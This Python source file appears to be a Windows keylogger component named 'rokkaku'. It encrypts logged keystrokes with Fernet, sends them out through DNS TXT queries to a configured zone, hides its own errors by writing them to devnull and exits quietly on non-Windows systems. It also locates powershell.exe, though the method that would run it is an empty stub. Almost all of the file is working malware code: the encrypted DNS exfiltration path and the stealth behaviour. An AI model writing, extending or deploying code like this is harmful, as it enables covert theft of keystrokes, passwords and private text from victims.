# -*- coding: utf-8 -*-

from __future__ import print_function
import os
import sys

debug = 0


def excepthook(exception_type, exception, traceback):
    if debug is 1:
        sys.__excepthook__(exception_type, exception, traceback)
        return
    with open(os.devnull, 'w') as nul:
        print('{0}: {1}'.format(exception_type.__name__, exception), file=nul)


sys.excepthook = excepthook

if os.name != 'nt':
    sys.exit(1)

try:
    import ConfigParser as configparser
except ImportError:
    import configparser

from builtins import bytes
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from io import StringIO

import base64
import ctypes
import dns.exception
import dns.resolver
import logging
import logging.handlers
import random
import socket
import time

cfg = u"""
[rokkaku]
dns_zone
password
"""


def cfg_factory(cfg):
    local_cfg = configparser.ConfigParser(allow_no_value=False)
    try:
        local_cfg.readfp(StringIO(cfg))
    except configparser.ParsingError:
        sys.exit(1)
    if not local_cfg.has_section('rokkaku'):
        sys.exit(1)
    return local_cfg


def aes_factory(cfg):
    digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
    password = cfg.get('rokkaku', 'password')
    digest.update(bytes(password, 'utf8'))
    key = base64.urlsafe_b64encode(digest.finalize())
    return Fernet(key)


def check_internet(host='8.8.8.8', port=53, timeout=3):
    socket.setdefaulttimeout(timeout)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    retries = 3
    while True:
        errno = sock.connect_ex((host, port))
        if errno == 0:
            sock.shutdown(socket.SHUT_RDWR)
            sock.close()
            return True
        retries -= 1
        if retries == 0:
            sock.close()
            return False
        time.sleep(random.randint((60 * 1), (60 * 10)))


mal_cfg = cfg_factory(cfg)


class PowerShell(object):

    def __init__(self):
        self._target = os.path.join(
            os.environ['SystemRoot'],
            'SysWOW64' if ctypes.sizeof(
                ctypes.c_void_p) == 4 else 'System32',
            'WindowsPowerShell',
            'v2.0',
            'powershell.exe')

    def run(self, command, args=[]):
        pass


class CryptoFormatter(logging.Formatter):

    converter = time.gmtime

    def __init__(self,
                 fmt='%(asctime)s %(message)s',
                 datefmt='%Y-%m-%d %H:%M:%S'):
        super(CryptoFormatter, self).__init__(fmt, datefmt)
        self.aes = aes_factory(mal_cfg)

    def format(self, record):
        levels = (
            logging.CRITICAL,
            logging.DEBUG,
            logging.ERROR,
            logging.INFO,
            logging.WARNING)
        if record.levelno not in levels:
            sys.exit(1)
        encrypted = self.aes.encrypt(
            bytes(logging.Formatter.format(self, record), 'utf8'))
        return encrypted.decode('utf8')


class ExfilHandler(logging.handlers.MemoryHandler):

    def __init__(self, **kwargs):
        super(ExfilHandler, self).__init__(**kwargs)

    @property
    def can_exfil(self):
        return True if self.target.stream.getvalue() else False

    def emit(self, record):
        self.buffer.append(record)
        if not self.shouldFlush(record):
            return
        self.flush()
        dns_zone = mal_cfg.get('rokkaku', 'dns_zone')
        if not self.can_exfil:
            return
        exfil_data = self.target.stream.getvalue().splitlines()
        for exfil in exfil_data:
            try:
                dns.resolver.query(
                    '{exfil}.{dns_zone}'.format(
                        exfil=exfil,
                        dns_zone=dns_zone),
                    rdtype=dns.rdatatype.TXT)
            except dns.exception.DNSException:
                continue
        self.target.stream = StringIO()


class Keylogger(object):

    b_sz = 100

    def __init__(self, logger=None):
        self.logger = logger or logging.getLogger(__name__)
        self.logger.setLevel(logging.INFO)
        stream_handler = logging.StreamHandler(StringIO())
        formatter = CryptoFormatter()
        stream_handler.setFormatter(formatter)
        self.exfil_handler = ExfilHandler(
            capacity=self.b_sz, target=stream_handler)
        self.logger.addHandler(self.exfil_handler)

    def log(self, key):
        self.logger.info(key)

    def __del__(self):
        self.logger.removeHandler(self.exfil_handler)
        self.exfil_handler.close()


if __name__ == '__main__':
    connectivity = check_internet()
    if not connectivity:
        sys.exit(1)
